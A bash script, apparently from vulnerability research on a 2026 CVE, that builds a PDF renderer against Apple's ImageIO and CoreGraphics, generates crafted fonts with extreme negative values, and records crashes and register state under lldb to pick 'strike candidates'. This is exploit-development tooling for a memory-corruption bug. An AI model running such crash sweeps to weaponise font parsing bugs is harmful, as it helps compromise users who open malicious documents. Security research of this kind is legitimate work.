#!/bin/bash
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render render.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python - << 'PYEOF'
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath('gen_k2.py')) or '.')
from gen_k2 import build_font
for tag, L in (("n80k", -80000), ("n120k", -120000), ("n160k", -160000), ("n200k", -200000),
               ("n240k", -240000), ("n280k", -280000), ("n320k", -320000), ("n390k", -390000),
               ("wild", 32000)):
    build_font(f"k2_{tag}.ttf", L); print(tag, L)
PYEOF
for TAG in n80k n120k n160k n200k n240k n280k n320k n390k wild; do
  ./venv/bin/python gen_pdf.py k2_${TAG}.pdf k2_${TAG}.ttf
  ./render k2_${TAG}.pdf >/dev/null 2>&1; echo "plain $TAG rc=$?" >> sweep_summary.txt
  # LLDBPLAIN: minimal perturbation (entry bp only) + natural crash + fault address
  lldb -b -o "breakpoint set -n aa_cache_render" -o "process launch -- k2_${TAG}.pdf" \
    -o "continue" -o "register read" -o "thread backtrace all" -o "quit" \
    ./render > lp_${TAG}.txt 2>&1 || true
  echo "lp $TAG: $(grep -m1 'stop reason' lp_${TAG}.txt)" >> sweep_summary.txt
done
# full traced runs on 4 strike candidates
for TAG in n160k n240k n320k n390k; do
  lldb -b -o "breakpoint set -n aa_cache_render" -o "process launch -- k2_${TAG}.pdf" \
    -o "command script import $PWD/../cg-extract/jtrace7.py" -o "detach" -o "quit" \
    ./render > l3_${TAG}.txt 2>&1 || true
done
cat sweep_summary.txt
cd ../..
mkdir -p findings && cp detonation/cve-2026-86950/{lp_*.txt,l3_*.txt,sweep_summary.txt} findings/
ls findings/ | wc -l
